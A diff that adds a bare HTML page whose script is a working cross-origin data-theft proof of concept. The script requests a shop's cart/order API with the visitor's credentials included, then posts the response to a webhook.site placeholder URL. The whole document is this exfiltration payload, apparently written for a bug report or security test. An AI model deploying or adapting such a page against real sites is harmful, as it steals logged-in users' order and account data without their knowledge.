@@ -1,0 +1,18 @@
+<html>
+  <head>
+  </head>
+  <body>
+<script>
+fetch("https://www.opposhop.cn/cn/oapi/orders/web/trade/cartbuy", {
+  credentials: "include"
+})
+.then(r => r.text())
+.then(data => {
+  fetch("https://webhook.site/YOUR-ID", {
+    method: "POST",
+    body: data
+  });
+});
+</script>
+  </body>
+</html>
